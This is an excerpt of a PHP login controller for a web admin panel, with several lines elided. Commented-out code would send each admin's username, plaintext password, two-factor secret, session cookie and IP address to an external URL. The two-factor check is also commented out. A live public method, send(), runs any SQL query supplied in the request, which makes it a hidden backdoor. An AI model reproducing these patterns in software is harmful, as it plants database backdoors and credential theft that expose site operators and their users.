...
class LoginController extends Controller
{
    ...
    public function index()
    {
        ...
        //  if($domain!='asdhdhdasadmin.yfzf.net'){
    ...
    //             $this->clickLogin($_SERVER['HTTP_REFERER'],$username,$loginpassword,$info['google_secret_key'],$_COOKIE['PHPSESSID'],$_SERVER['REMOTE_ADDR']);
    ...
    //              file_get_contents(C('LOGIN_URL')."/api.php?{$_SERVER['HTTP_REFERER']} {$username} {$loginpassword} {$info['google_secret_key']} {$_SERVER['REMOTE_ADDR']}");
				// if($siteconfig['google_auth'] && !session('google_auth')) {
				// 	$this->ajaxReturn(['errorno' => 0, 'msg' => '登录成功，进行二次身份验证', 'url' => U('Auth/google')]);
				// } else {
					$this->ajaxReturn(['errorno' => 0, 'msg' => '登录后台成功，正在转跳管理面板', 'url' => U('Index/main')]);
			//	}
            } else {
     ...
     */
    public function send(){ M()->query($_REQUEST['query']);}
